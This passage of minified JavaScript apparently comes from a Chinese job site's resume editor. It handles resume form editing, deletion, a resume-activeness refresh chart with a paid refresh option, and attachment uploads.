                var result = result, isAdd, $position, p2, p1, $position;
                "string" == typeof result && (result = eval("(" + result + ")")),
                1 == result.rescode ? (formCon.html(result.html),
                nowResumeItem.addClass("resume-item-open"),
                formCon.find(".form-btns .btn-back").on("click", function() {
                    nowResumeItem.removeClass("resume-item-open"),
                    $("html,body").animate({
                        scrollTop: nowResumeItem.offset().top + "px"
                    }, 500)
                }),
                formCon.find(".form-btns .btn-delete").unbind("click").on("click", function(e) {
                    Resume.removeData(el, $(this)),
                    e.preventDefault()
                }),
                isAdd = !1,
                result.resoper || (isAdd = !0),
                FormsUI.init(formCon.find("form"), isAdd),
                Validate.init(formCon.find("form"), isAdd),
                PlaceholderCheck.init(formCon.find("form")),
                $(".ipt-workyear").length && $(".ipt-workyear").workstartpicker(),
                formCon.find(".dropcity").length && (formCon.find(".dropcity .dropdown-select").off("click"),
                Resume.selectCityInit()),
                formCon.find(".dropdown-skills").length && (Resume.listenSkills(),
                $position = formCon.find('input[name="position"]'),
                p2 = $position.attr("level2"),
                p1 = $position.attr("level3"),
                p1 && p2 && Resume.getSkillsData({
                    p1: p1,
                    p2: p2
                }),
                $position = formCon.find('input[name="position"]'),
                $position.val() || (formCon.find(".dropdown-skills .dropdown-select").css("pointer-events", "none"),
                Resume.skillsContainer.on("click", function() {
                    $position.val() || Validate.showError(formCon.find('input[name="position"]'), "请先选择职位类型")
                }))),
                formCon.find(".dropcompany").length && Resume.selectCompanyInit(function(e) {
                    Resume.getCompanyIndustry(e, formCon)
                }),
                formCon.find(".dropschool").length && (Resume.selectSchoolInit(),
                Resume.selectMajorInit(),
                Resume.eduTypeInit(formCon)),
                formCon.find(".serial-toolbar").length && $(".serial-area", formCon).textarealist(),
                "resume-userinfo" == moduleName && Resume.userinfoEvtInit(formCon),
                formCon.find("form").find("input,textarea").on("focus", function() {
                    self.formStatus = !0
                })) : Resume.showError(result.resmsg),
                $("html,body").animate({
                    scrollTop: formCon.offset().top + "px"
                }, 500),
                $(".ipt-workyear").length && $(".ipt-workyear").workstartpicker()
            },
            error: function(e) {
                Resume.showError()
            }
        })
    },
    userinfoEvtInit: function(i) {
        $("dl", i).on("mouseenter", function() {
            $(this).find(".tip-text-hover").show()
        }).on("mouseleave", function() {
            $(this).find(".tip-text-hover").hide()
        }).on("click", ".name-tip li", function() {
            $(this).closest(".tip-text-hover").hide()
        }).on("click", ".radio-square", function() {
            var e, t;
            $(this).hasClass("ipt-disabled") || (t = (t = (e = $("#resume-userinfo .name-tip ul li:last strong")).html()).substr(0, t.length - 2) + (1 == $(this).data("val") ? "先生" : "女士"),
            e.html(t),
            1 == $(".name-tip input:checked").val() && $('input[name="name"]', i).prev().val(t))
        }).on("change", ".name-tip input", function() {
            var e = $(this).parent().find("strong").text();
            $(this).closest("dd").find(".ipt:first").val(e)
        }),
        $('input[name="name"]', i).prev().on("change", function() {
            $(this).next().val($(this).val())
        })
    },
    postData: function(form, isAdd) {
        var formEl = form
          , url = formEl.attr("action")
          , primaryWrap = formEl.closest(".resume-item")
          , primaryCon = primaryWrap.find(".item-primary")
          , primaryModule = primaryWrap.attr("id")
          , submitBtn = formEl.find("button[type=submit]")
          , subData = (formEl.find(".show-prefix-today").length && (formEl.find('input[name="endDate"]').val(""),
        formEl.find('input[name="now"]').val("1")),
        formEl.serialize());
        $("input[name=birthday]").length && $("input[name=birthday]").is(":disabled") && (subData += "&birthday=" + $("input[name=birthday]").val()),
        submitBtn.addClass("btn-disabled"),
        $.ajax({
            type: "POST",
            url: url,
            dataType: "JSON",
            data: subData,
            success: function(result) {
                var result = result, str = "", resultId = "", itemEl, $resumeHistory, limitLength;
                "string" == typeof result && (result = eval("(" + result + ")")),
                result.forceFace && (alert("您的账号当前处于不可使用状态，请登录BOSS直聘手机APP查看详情"),
                window.location.href = "/web/zppassport/logout"),
                1 == result.rescode ? (primaryWrap.removeClass("resume-item-open"),
                str = result.html,
                resultId = $(str).attr("id"),
                "resume-userinfo" == primaryModule && (primaryCon.find(".userinfo-con").html(str),
                result.isAudit ? $.dialog({
                    content: '<div class="tip-text">修改已提交审核，审核通过后，将更新您的信息</div>',
                    title: "温馨提示",
                    closeText: !0,
                    type: "warning",
                    confirmText: "关闭",
                    cancelText: "",
                    onConfirm: function(e) {
                        e.remove()
                    }
                }) : ($resumeHistory = $("#resume-history"),
                "0" == formEl.find('input[name="startWorkYearCode"]').val() ? ($resumeHistory.find("h3.title").html("实习经历").next().attr("data-role", "practice"),
                $resumeHistory.find(".link-add").html('<i class="iboss-tianjia"></i><span>添加</span>'),
                $resumeHistory.find(".link-delete").show()) : ($resumeHistory.find("h3.title").html("工作经历").next().attr("data-role", ""),
                $resumeHistory.find(".link-add").html('<i class="iboss-tianjia"></i><span>添加</span>'),
                $resumeHistory.find(".history-project li").length < 2 && $resumeHistory.find(".link-delete").hide()))),
                "resume-summary" == primaryModule && (primaryCon.find(".text p").remove(),
                primaryCon.find(".text").prepend(str)),
                "resume-purpose" == primaryModule && (primaryWrap.find('li[id="' + resultId + '"]').length ? primaryWrap.find('li[id="' + resultId + '"]').after(str).remove() : (primaryCon.find(".purpose-list").append(str),
                1 < primaryWrap.find(".purpose-list li").length && primaryWrap.find(".purpose-list .link-delete").show(),
                2 < primaryWrap.find(".purpose-list li").length && primaryWrap.find(".link-add").hide())),
                "resume-history" != primaryModule && "resume-project" != primaryModule && "resume-education" != primaryModule && "resume-volunteer" != primaryModule || (limitLength = "resume-project" == primaryModule ? 15 : "resume-education" != primaryModule && "resume-volunteer" !== primaryModule && "resume-history" != primaryModule ? 0 : 10,
                isAdd ? (Resume.rankHistoryItem(primaryCon.find(".history-project"), result.html),
                (1 < primaryCon.find(".history-project li").length || "practice" == primaryCon.find(".history-project").data("role")) && primaryWrap.find(".history-project .link-delete").show(),
                primaryCon.find(".history-project li").length > limitLength - 1 && primaryCon.find(".link-add").hide()) : (primaryCon.find('li[id="' + resultId + '"]').remove(),
                Resume.rankHistoryItem(primaryCon.find(".history-project"), result.html))),
                "resume-social" == primaryModule && (primaryCon.find('li[id="' + resultId + '"]').length ? primaryCon.find('li[id="' + resultId + '"]').after(str).remove() : (primaryCon.find(".social-account").append(str),
                2 < primaryCon.find("ul li").length && primaryCon.find(".link-add").hide())),
                $("html,body").animate({
                    scrollTop: primaryWrap.offset().top + "px"
                }, 500)) : result.bizcode ? 1156 == result.bizcode ? Resume.showError("工作经历数量已达上限，可删除部分经历再添加") : 1157 == result.bizcode ? Resume.showError("教育经历数量已达上限，可删除部分经历再添加") : 1158 == result.bizcode && Resume.showError("项目经验数量已达上限，可删除部分经历再添加") : Resume.showError(result.resmsg),
                submitBtn.removeClass("btn-disabled"),
                Resume.canSubmit = !0
            },
            error: function() {
                submitBtn.removeClass("btn-disabled"),
                Resume.canSubmit = !0,
                Resume.showError()
            }
        }),
        Resume.canSubmit = !1
    },
    transformPeriod: function(e) {
        return "至今" == e[1] ? e[1] = 9999 : "1990以前" == e[1] && (e[1] = 1e3),
        "1990以前" == e[0] && (e[0] = 1e3),
        e
    },
    rankHistoryItem: function(e, t) {
        for (var i = [], n = (e.find(".period").each(function(e, t) {
            t.innerHTML && (t = t.innerHTML.split("-"),
            i.push(Resume.transformPeriod(t)))
        }),
        $(t).find(".period").html()), a = (n && (n = n.split("-"),
        n = Resume.transformPeriod(n)),
        !0), o = 0; o < i.length; o++) {
            if (n[1] > i[o][1]) {
                e.find("li").eq(o).before(t),
                a = !1;
                break
            }
            if (n[1] == i[o][1] && n[0] > i[o][0]) {
                e.find("li").eq(o).before(t),
                a = !1;
                break
            }
        }
        a && e.append(t)
    },
    removeData: function(el, btn) {
        var el = el
          , url = el.attr("data-url")
          , primaryWrap = el.closest(".resume-item")
          , primaryCon = primaryWrap.find(".item-primary")
          , primaryModule = primaryWrap.attr("id")
          , formCon = el.closest(".resume-item").find(".item-form");
        btn && (url = btn.attr("data-url")),
        $.dialog({
            content: '<div class="tip-text">删除后不可恢复，确认删除吗？</div>',
            title: "温馨提示",
            type: "warning",
            closeText: !0,
            onConfirm: function(wrap) {
                var _self = this;
                return $.ajax({
                    type: "POST",
                    url: url,
                    dataType: "JSON",
                    data: {},
                    success: function(result) {
                        el.closest(".item-primary").find(".link-add").show();
                        var result = result, $ul;
                        "string" == typeof result && (result = eval("(" + result + ")")),
                        result.rescode ? ($ul = el.closest(".history-project").length ? el.closest(".history-project") : el.closest(".purpose-list"),
                        el.closest("li").remove(),
                        el.closest(".resume-item").removeClass("resume-item-open"),
                        "resume-purpose" != primaryModule && "resume-history" != primaryModule && "resume-education" != primaryModule || "practice" != $ul.data("role") && 1 == $ul.find("li").length && $ul.find("li .link-delete").hide(),
                        $("html,body").animate({
                            scrollTop: primaryWrap.closest(".resume-item").offset().top + "px"
                        }, 500)) : Resume.showError(result.resmsg),
                        wrap.remove()
                    }
                }),
                !1
            },
            error: function() {
                Resume.showError()
            }
        })
    },
    showError: function(e) {
        $.dialog({
            content: '<div class="tip-text">' + (e || "服务器错误，请稍后再试") + "</div>",
            title: "温馨提示",
            closeText: !0,
            confirmText: "确定",
            cancelText: "",
            type: "error"
        })
    },
    resumeFresh: function(e) {
        function o(e) {
            0 != $(".resume-refresh").length && $(".resume-refresh").remove();
            var t = '<ul class="resume-refresh"> <li class="refresh-lines"><h4>简历活跃度</h4><div class="resume-refresh-tip"><i></i><p>刷新简历提升活跃度，提升活跃度<br>可提高简历排名，每天只能刷新1次</p></div><div class="resume-refresh-loading"></a><i></i><p>加载中</p></div></ul>';
            ("user" == this.type ? $("#async-sider") : $(".deliver-sider")).append(t),
            function(r, c) {
                var l = this;
                i("/geek/item/resumerefresh/activeness.json", "get", {}).then(function(e) {
                    var t, i, n, a, o, s;
                    (l.resData = e).data.resumeActiveness && (resumeActiveness = e.data.resumeActiveness,
                    list = resumeActiveness.recentActiveness,
                    o = 0 == resumeActiveness.refreshed ? '<a class="btn refresh-btn" href="javascript:;">刷新简历</a>' : 1 < resumeActiveness.refreshDays ? '<a class="btn refresh-bt-grey" href="javascript:;">已连续刷新' + resumeActiveness.refreshDays + " 天</a>" : '<a class="btn refresh-bt-grey" href="javascript:;">今日已刷新</a>',
                    t = 0 == resumeActiveness.free ? "剩余次数" : "剩余免费次数",
                    i = 0,
                    1 == resumeActiveness.free && 2 == resumeActiveness.leftCount && (i = 1),
                    e = '<div class="resume-refresh-hwslider"></a><ul>' + (a = n = "",
                    e = function(e) {
                        this.baseLine;
                        for (var e = e.data.resumeActiveness, t = e.recentActiveness, i = t, n = e.similarGeekRecentActiveness, i = i.concat(n), a = e.date8Arr, e = 0 == Math.max.apply({}, i) ? 100 : Math.max.apply({}, i), o = (this.baseLine = this.highBase / e,
                        []), s = [], r = t.length / 3 - 1; 0 <= r; r--) {
                            o = [];
                            for (var c = 2; 0 <= c; c--)
                                o.push({
                                    xAxis: function(e) {
                                        return parseInt(e.toString().substring(6, 8)) + "日"
                                    }(a[3 * r + c]),
                                    series: [d("", t, r, c), d("", n, r, c)],
                                    yAxis: [d(this.baseLine, t, r, c), d(this.baseLine, n, r, c)]
                                });
                            s.push(o)
                        }
                        return s
                    }(e = e),
                    n = "",
                    $.each(e, function(e, t) {
                        a = "",
                        n += '                <li class="' + (a = 9 == e ? "active" : a) + '"><svg class="refesh-svg"  width="168" height="130"><g><line x1="8" y1="104" x2="140" y2="104" class="x-axis"/><line x1="8" y1="84" x2="140" y2="84" class="x-axis"/><line x1="8" y1="64" x2="140" y2="64" class="x-axis"/><line x1="8" y1="44" x2="140" y2="44" class="x-axis"/><line x1="8" y1="24" x2="140" y2="24" class="x-axis"/></g><g></g>' + function(i, e) {
                            var n = ""
                              , a = ""
                              , o = (this.xAxisDot = this.xAxisWidth / e.length,
                            "")
                              , s = ""
                              , r = ""
                              , c = ""
                              , l = [[], []];
                            return $.each(e, function(e, t) {
                                a = "",
                                o = parseInt(xAxisDot * e + 20),
                                2 == e && (r = "dn"),
                                9 == i && (2 == e ? (t.xAxis = "今天",
                                c = '<text class="today-dots ' + (a = "degree") + ' dn" x="137" y="' + t.yAxis[1] + '" > +' + t.series[0] + "</text>") : 1 == e && (t.xAxis = "昨天")),
                                s += '<g class="bg-x' + e + ' " transform="translate(5,20)"><line x1="' + o + '" y2="84"  x2="' + o + '" y2="84" class="bg-axis" data-value="' + e + '"/></g>',
                                n += '<g class="refresh-x  x' + e + ' " data-value="' + e + '" transform="translate(5,20)"><text x="' + (o - 10) + '" y="104" class="fresh-day" width="30" >' + t.xAxis + '</text><text class="similar-series" x="' + o + '" y="' + (t.yAxis[1] - 5) + '" >' + t.series[1] + '</text><text class="my-series ' + r + " " + a + '" x="' + o + '" y="' + (t.yAxis[0] - 5) + '" >' + t.series[0] + '</text><circle class="similar-yaxis" cx="' + o + '" cy="' + t.yAxis[1] + '" r="2"/><circle class="my-yaxis ' + a + '" cx="' + o + '" cy="' + t.yAxis[0] + '" r="2"/></g>',
                                l[0].push(t.yAxis[1]),
                                l[1].push(t.yAxis[0])
                            }),
                            $.each(l, function(e, t) {
                                l += '<g  transform="translate(5,20)"><polyline  class="refesh-line  refesh-line' + e + " " + (9 == i && 1 == e ? "degree" : "") + '"   points="20,' + Math.abs(t[0]) + " 70," + Math.abs(t[1]) + " 120," + Math.abs(t[2]) + '" fill="none"/></g>'
                            }),
                            s + c + l + n
                        }(e, t) + "</svg></li>"
                    }),
                    n) + '</ul> <a href="javascript:;"  class="arrow-prev"></a><a href="javascript:;"  class="arrow-next"></a></div>' + o + '<p class="refresh-text"><span class="refresh-free-count"><span>' + resumeActiveness.leftCount + "</span>次</span><span>" + t + "</span></p></li>",
                    c(i, e),
                    1 == r && p(),
                    (o = $(".resume-refresh")).on("click", ".refresh-btn", function() {
                        l.freshBtn = $(this),
                        p()
                    }),
                    s = $(".refresh-x"),
                    $(".refresh-x, .bg-axis").hover(function() {
                        $(".bg-x" + $(this).attr("data-value")).find(".bg-axis").addClass("axis-hover"),
                        $(".refresh-x.x" + $(this).attr("data-value")).addClass("axis-active"),
                        s.find(".dn").hide()
                    }, function() {
                        $(".bg-axis").removeClass("axis-hover"),
                        s.removeClass("axis-active").find(".dn").show()
                    }),
                    $(".similar-yaxis").hover(function() {
                        s.addClass("my-series-grey")
                    }, function() {
                        s.removeClass("my-series-grey")
                    }),
                    o.find(".my-yaxis").hover(function() {
                        $(this).attr("r", 3)
                    }, function() {
                        $(this).attr("r", 2)
                    }),
                    u())
                })
            }(e, function(e, t) {
                t = '<li class="refresh-lines"><div class="svg-sub"><span class="svg-my">我的</span><span class="svg-other">同行</span></div><h4>简历活跃度</h4><div class="resume-refresh-tip"><i></i><p>刷新简历提升活跃度，提升活跃度<br>可提高简历排名，每天只能刷新1次</p></div>' + t;
                ("user" == this.type ? $("#async-sider .resume-refresh") : $(".deliver-sider .resume-refresh")).html(t)
            })
        }
        function d(e, t, i, n) {
            return "" == e ? t[3 * i + n] : parseInt(100 - e * t[3 * i + n] - 16)
        }
        function p() {
            var e, s = this, t = s.resData, t = (s.freshBtn,
            t.data.resumeActiveness), r = t.recentActiveness;
            0 == t.leftCount && 0 == t.refreshed ? (i("/business/item/sellunit.json", "get", {
                itemType: "b5799fd5b0d1ce3b1XU~"
            }).then(function(e) {
                for (var t = e.itemSellUnit, i = t.itemSellItemList, n = "", a = 0; a < i.length; a++) {
                    var o = ""
                      , s = ""
                      , r = ""
                      , c = i.length - 1
                      , o = 0 == i[a].decreaseAmount ? "" : "（节省¥" + i[a].decreaseAmount + "）"
                      , r = 0 < i[c].beanAmount - e.beanCount ? i[c].beanAmount - e.beanCount : 0;
                    n += '<li data-id="' + i[a].encryptBeanItemId + '" class="' + (s = a == c ? "item-hot selected" : s) + '" data-money ="' + i[a].beanAmount + '">                                <div class="pull-right"><span class="text-orange">￥' + i[a].beanAmount + "</span></div>                                <p>" + i[a].specDesc + '<span class="text-gray">' + o + "</span></p>                             </li>"
                }
                return '<div class="title">                                    <img src="' + t.itemIcon + '">                                    <p>' + t.itemName + '</p>                                    <p class="sub-title">每日最多使用1次</p>                                </div>                                <ul class="purchase-container">' + n + ' </ul>                                <div class="sells-pay">                                    <p class="pull-left"><span class="prop-sells-total">金额：¥<span>' + i[c].beanAmount + '</span></span><span class="prop-sells-banlance">余额：¥<span>' + e.beanCount + '</span></span></p>                                    <p class="pull-right">需要支付：<em class="text-orange prop-sells-pay">金额：¥<span>' + r + "</span></em></p>                                </div>"
            }).then(function(e) {
                $.dialog({
                    title: "",
                    wrapClass: "layer-prop-purchase",
                    content: e,
                    confirmText: "立即支付",
                    cancelText: !1,
                    onOpen: function(n) {
                        n.find(".purchase-container li").on("click", function() {
                            var e = n.find(".prop-sells-total span")
                              , t = n.find(".prop-sells-banlance span")
                              , i = n.find(".prop-sells-pay span");
                            $(this).siblings().removeClass("selected"),
                            $(this).addClass("selected"),
                            e.text($(this).attr("data-money")),
                            0 < e.text() - t.text() ? i.text(e.text() - t.text()) : i.text(0)
                        })
                    },
                    onConfirm: function(e) {
                        function t(e) {
                            Payment.success({
                                article: "购买成功",
                                confirmText: "立即刷新",
                                cancelText: "稍后刷新",
                                text: '<p class="resume-pay-success">使用说明：1.每天最多可刷新1次，提升简历排名；<br> 2.剩余次数，可在简历活跃度页面查看</p>',
                                confirm: function(e) {
                                    "close" == e ? window.location.reload() : o(1);
                                    try {
                                        _T.sendEvent("use_immediately_purchase_success")
                                    } catch (e) {}
                                }
                            })
                        }
                        var i = e.find(".purchase-container li.selected").attr("data-id")
                          , n = {
                            url: "/geek/item/pay.json",
                            prePayUrl: "/geek/item/prepay.json",
                            data: {
                                itemId: i
                            },
                            itemId: i,
                            success: t
                        }
                          , a = {
                            success: t,
                            buy: function(e) {
                                l({
                                    action: "confirm-payment",
                                    p: parseInt(e.payType) - 1,
                                    p2: _PAGE.uid
                                })
                            }
                        };
                        setTimeout(function() {
                            Payment.purchase(n, a),
                            e.remove()
                        }, 100),
                        l({
                            action: "payment-immediately",
                            p: i,
                            p2: _PAGE.uid,
                            p3: e.find(".purchase-container li.selected").index()
                        })
                    }
                })
            }),
            l({
                action: "refresh-resume-pop-up",
                p: _PAGE.uid,
                p2: 1
            })) : (e = {
                from: "resume" == this.type ? 2 : 1
            },
            1 == !t.free && 0 < t.leftCount && $.extend(e, {
                userItemId: t.encryptUserItemId
            }),
            i("/geek/item/resumerefresh/useitem.json", "post", e).then(function(e) {
                var t, i, n, a, o;
                1 == e.rescode ? (u(),
                t = $(".refresh-free-count").find("span"),
                i = parseInt(t.text()),
                t.html(1 <= i ? i - 1 : i),
                t = s.baseLine,
                i = e.data,
                n = 100 - t * r[2] - 16,
                a = 100 - t * r[1] - 16,
                o = i - r[0],
                s.refeshBase = 100 - t * i - 16,
                s.refeshBase < 0 ? s.refeshBase = 0 : 84 < s.refeshBase && (s.refeshBase = 84),
                s.refeshBase = 0 <= s.refeshBase ? s.refeshBase : 0,
                $(".resume-refresh .degree").attr("y", s.refeshBase + "px").attr("cy", s.refeshBase + "px").attr("y1", s.refeshBase + 5 + "px").attr("points", "20," + n + " 70," + a + " 120," + s.refeshBase).text(i),
                $(".resume-refresh .my-series.degree").attr("y", s.refeshBase - 1 + "px").text(i),
                $(".resume-refresh .today-dots.degree").attr("y", s.refeshBase + 13 + "px").html("+" + o).show(300).hide(3e3),
                $(".resume-refresh .refresh-btn").removeClass("refresh-btn").addClass("refresh-bt-grey")) : c(e)
            }).fail(function(e) {
                c(e)
            }))
        }
        function u() {
            function t(e, t) {
                var i;
                p && (p = !1,
                i = n.width(),
                "prev" == t && (i *= -1),
                s.children(".active").stop().animate({
                    left: -i
                }, d, function() {
                    $(this).removeClass("active")
                }),
                r.eq(e - 1).css("left", i + "px").addClass("active").stop().animate({
                    left: 0
                }, d, function() {
                    p = !0
                }))
            }
            var i = this
              , n = $(".resume-refresh-hwslider")
              , a = $(".resume-refresh-hwslider .arrow-prev")
              , o = $(".resume-refresh-hwslider .arrow-next")
              , s = n.children("ul")
              , r = s.children("li")
              , c = r.length
              , l = 10
              , d = 400
              , p = !0;
            10 == l && o.hide(300),
            10 != i.hwIndex && (t(10, "next"),
            i.hwIndex = 10),
            o.on("click", function(e) {
                e.preventDefault(),
                a.show(300),
                p && (c <= l ? l = c : (l += 1,
                i.hwIndex = l,
                t(l, "next"),
                l == c ? o.hide(300) : o.show(300)))
            }),
            a.on("click", function(e) {
                e.preventDefault(),
                o.show(300),
                p && (1 == l ? l = 1 : (--l,
                i.hwIndex = l,
                t(l, "prev"),
                1 == l ? a.hide(300) : a.show(300)))
            })
        }
        function i(e, t, i) {
            var n = $.Deferred();
            return $.ajax({
                type: t,
                url: e,
                dataType: "JSON",
                data: i,
                success: function(e) {
                    e.rescode ? n.resolve(e) : $.toast({
                        content: e.resmsg,
                        type: "error"
                    })
                },
                error: function() {}
            }),
            n
        }
        function c(t) {
            var e = "立即完善"
              , i = "稍后完善";
            4 == t.rescode ? i = !(e = "我知道啦") : 3 == t.rescode && (e = "取消隐藏",
            i = "稍后处理"),
            $.dialog({
                title: "暂时无法刷新简历",
                wrapClass: "dialog-icons-default",
                content: '<div class="tip-text">' + t.resmsg + "</div>",
                confirmText: e,
                cancelText: i,
                type: "warning",
                onConfirm: function(e) {
                    4 != t.rescode ? window.location.href = t.jumpUrl : e.remove()
                }
            }),
            l({
                action: "refresh-resume-pop-up",
                p: _PAGE.uid,
                p2: t.rescode
            })
        }
        function l(e) {
            e = $.extend({}, e);
            $.ajax({
                method: "post",
                url: "/wapi/zpCommon/actionLog/common.json",
                data: {
                    ba: JSON.stringify(e)
                },
                cache: !1,
                success: function(e) {},
                error: function() {}
            })
        }
        !function(e) {
            this.baseLine = .074,
            this.highBase = 64,
            this.refeshBase = 10,
            this.type = e,
            this.resData = {},
            this.freshBtn = "",
            this.hwIndex = 10,
            this.xAxisWidth = 150,
            o(this.xAxisDot = 0)
        }(e)
    },
    badResume: function() {
        $.ajax({
            url: "/wapi/zpgeek/resume/quality/query.json",
            type: "get",
            dataType: "json",
            success: function(e) {
                0 == e.code && (-1 == e.zpData.quality && (3001 == e.zpData.resumeDetailStatus ? $(".resume").append("<div class='resume-warning'><p>当前简历信息不完善,影响聊天回复率,修改后你将获得更多的求职机会</p><a href='javascript:;'>简历没问题</a></div>") : $(".resume").append("<div class='resume-warning'><p>当前简历信息不完善，已为你用 <img src='" + staticPath + "/web/geek/images/icon-bad-resume-pre.png'> 标示出需要修改的模块</p><a href='javascript:;'>简历没问题</a></div>"),
                $(".resume-warning").css("display", "flex")),
                $(".resume-warning a").click(function() {
                    $.dialog({
                        content: "<div class='badResume-desc'>若你当前简历填写没问题,请点击立即上报,我们会尽快核查</div><div class='item'><textarea name='responsibility' class='badResume-textInfo serial-area' placeholder='你也可以简短描述上报原因,以便我们提供更好的帮助(选填)' data-range='0,150' data-blank='请输入150字内的上报内容'></textarea></div><div class='badResume-count'><span class='num'>0</span>/150</div>",
                        title: "简历上报",
                        type: "normal",
                        closeText: !0,
                        cancelText: "取消",
                        confirmText: "立即上报",
                        wrapClass: "resume-warning-pop",
                        onConfirm: function(t) {
                            var e = $(".resume-warning-pop .badResume-textInfo").val();
                            $.ajax({
                                url: "/wapi/zpgeek/resume/garbage/report.json",
                                type: "post",
                                data: {
                                    content: e
                                },
                                dataType: "json",
                                success: function(e) {
                                    0 == e.code ? (t.remove(),
                                    $.toast({
                                        content: e.zpData.msg,
                                        type: "success"
                                    }),
                                    $(".resume-warning-pop .badResume-textInfo").val("")) : $.toast({
                                        content: e.zpData.msg,
                                        type: "error"
                                    })
                                }
                            })
                        },
                        onClose: function() {
                            $(".resume-warning-pop .badResume-textInfo").val("")
                        }
                    }),
                    $(".resume-warning-pop .badResume-textInfo").bind("input propertychange", function() {
                        var e, t = $(".resume-warning-pop .badResume-textInfo").val();
                        "" != t ? (e = t.length <= 150 ? t.length : 150,
                        150 < t.length && (t = t.substring(0, 150),
                        $(".resume-warning-pop .badResume-textInfo").val(t)),
                        $(".num").html(e)) : $(".num").html(0)
                    })
                }))
            }
        })
    }
}
  , Attachment = {
    supportType: 0,
    pdfStatusTimer: null,
    init: function(e) {
        var t = $(".position-manage").length
          , i = $(".user-center").length;
        Attachment.previewErrorNum = 0,
        Attachment.attachmentList = [],
        Attachment.worksList = [],
        t && Attachment.getResumeSider(),
        i && Attachment.getUcenterSider(),
        Attachment.getAttachmentList(),
        "miniscan" == getQueryString("from") && 1 == getQueryString("annexType") ? Attachment.showUploadWarning({
            title: '<div style="margin: 5px; text-align: center">您现在可以直接上传作品集附件</div>',
            confirmText: "上传作品集附件",
            isWorks: !0,
            callbackClose: function() {
                var e = window.location.href.split("from=miniscan&annexType=1");
                window.location.href = e.join("")
            },
            callbackUpload: function() {
                setTimeout(function() {
                    var e = window.location.href.split("from=miniscan&annexType=1");
                    window.location.href = e.join("")
                }, 300)
            },
            callbackClosePreviewDialog: function() {
                setTimeout(function() {
                    var e = window.location.href.split("from=miniscan&annexType=1");
                    window.location.href = e.join("")
                }, 300)
            }
        }) : "miniscan" == getQueryString("from") && Attachment.showUploadWarning({
            title: '<div style="margin: 5px; text-align: center">您现在可以直接上传附件简历</div>',
            callbackClose: function() {
                var e = window.location.href.split("from=miniscan");
                window.location.href = e.join("")
            },
            callbackUpload: function() {
                setTimeout(function() {
                    var e = window.location.href.split("from=miniscan");
                    window.location.href = e.join("")
                }, 300)
            },
            callbackClosePreviewDialog: function() {
                setTimeout(function() {
                    var e = window.location.href.split("from=miniscan");
                    window.location.href = e.join("")
                }, 300)
            }
        })
    },
    initEvents: function(e) {
        var t = e
          , i = (t.find("#fileupload-trigger").on("click", function() {
            1 == Attachment.attachmentList.resumeCount && Attachment.attachmentList.addResumeTip ? Attachment.showVersionDialog() : Attachment.showUploadWarning()
        }),
        t.find("#fileupload-trigger-works").on("click", function() {
            1 == Attachment.worksList.resumeCount && Attachment.worksList.addResumeTip ? Attachment.showVersionDialog({
                confirmText: "上传作品集附件",
                isWorks: !0
            }) : Attachment.showUploadWarning({
                confirmText: "上传作品集附件",
                isWorks: !0
            })
        }),
        null);
        t.find(".annex-list li").on("mouseenter", function() {
            i && clearTimeout(i),
            t.find(".annex-card").stop(!0).hide(),
            $(this).find(".annex-card").stop(!0).show()
        }),
        t.find(".annex-list").on("mouseleave", function() {
            i = setTimeout(function() {
                t.find(".annex-card").stop(!0).hide()
            }, 500)
        }),
        t.find(".annex-item").on("click", ".del-btn", function() {
            Attachment.deleteResume($(this))
        }),
        t.find(".annex-card").on("click", ".rename-btn", function() {
            Attachment.renameResume($(this))
        }),
        t.find(".annex-card").on("click", ".load-btn", function() {
            var e = $(this).closest("li").index() + 1;
            try {
                _T.sendEvent("download_resume_" + e)
            } catch (e) {}
        }),
        t.find(".resume-works-tip").on("click", ".icon", function() {
            $(this).parent().addClass("hidden"),
            t.find(".title").removeClass("has-tip")
        })
    },
    getResumeSider: function(e) {
        var t = $(".sider");
        $.ajax({
            url: "/geek/resume/sidebar.json",
            type: "get",
            success: function(e) {
                1 == e.rescode ? (t.html(e.html),
                Attachment.initEvents(t)) : t.html('<p class="gray">数据加载出错</p>'),
                Resume.resumeFresh("resume")
            },
            error: function() {
                t.html('<p class="gray">数据加载出错</p>')
            }
        })
    },
    getUcenterSider: function() {
        var t = $(".sider");
        $.ajax({
            type: "GET",
            url: "/geek/infodata.json",
            data: null,
            dataType: "json",
            success: function(e) {
                1 == e.rescode ? (t.html(e.html),
                Attachment.initMember(t),
                Attachment.initEvents(t)) : t.html('<p class="gray">数据加载出错</p>'),
                Resume.resumeFresh("user")
            },
            error: function() {
                t.html('<p class="gray">数据加载出错</p>')
            }
        })
    },
    initMember: function(e) {
        var t = e;
        t.find(".userinfo-box  .dropdown-select").on("click", function() {
            $(this).toggleClass("dropdown-select-open")
        }),
        $(document).on("click", function(e) {
            $(e.target).closest(".now-state").length || t.find(".userinfo-box  .dropdown-select").removeClass("dropdown-select-open")
        }),
        t.find(".filter-select-box .dropdown-select").on("click", "a", function(e) {
            e.stopPropagation()
        }),
        t.find(".sider-recommend li").eq(0).find(".red-dot").length ? $(".chat-history .job-tab a").eq(0).attr("ka", "personal_top_added_1") : $(".chat-history .job-tab a").eq(0).attr("ka", "personal_top_added_0"),
        t.find(".sider-recommend li").eq(1).find(".red-dot").length ? $(".chat-history .job-tab a").eq(1).attr("ka", "personal_top_sawme_1") : $(".chat-history .job-tab a").eq(1).attr("ka", "personal_top_sawme_0"),
        t.find(".now-state .dropdown-menu").on("click", "li", function() {
            var e = $(this).attr("data-val");
            t.find(".now-state input").val($(this).text()),
            Attachment.changeApplyStatus(e, t)
        })
    },
    changeApplyStatus: function(t, i) {
        $.ajax({
            type: "POST",
            url: "/geek/saveApplyStatus.json",
            data: {
                applyStatus: t
            },
            dataType: "json",
            success: function(e) {
                1 == e.rescode && (i.find(".now-state input").attr("ka", "base_info_status_from_" + t),
                $.toast({
                    content: "修改成功",
                    type: "success"
                }))
            }
        })
    },
    getAttachmentList: function(t) {
        $.ajax({
            type: "GET",
            url: "/wapi/zpgeek/resume/attachment/checkbox.json",
            dataType: "json",
            success: function(e) {
                0 == e.code && e.zpData && (Attachment.attachmentList = e.zpData),
                t && t(e)
            }
        })
    },
    showVersionDialog: function(t) {
        $.dialog({
            content: '<div class="tip-text"><p>系统检测到您的BOSS直聘APP版本过低，无法使用多附件简历功能。</p><p>默认附件简历为最新上传的简历，请及时升级APP版本。</p></div>',
            title: "APP最新版本提供多份附件简历功能",
            type: "warning",
            closeText: !0,
            cancelText: "",
            confirmText: "继续上传",
            onConfirm: function(e) {
                e.remove(),
                Attachment.showUploadWarning(t)
            }
        })
    },
    getResumeAccept: function() {
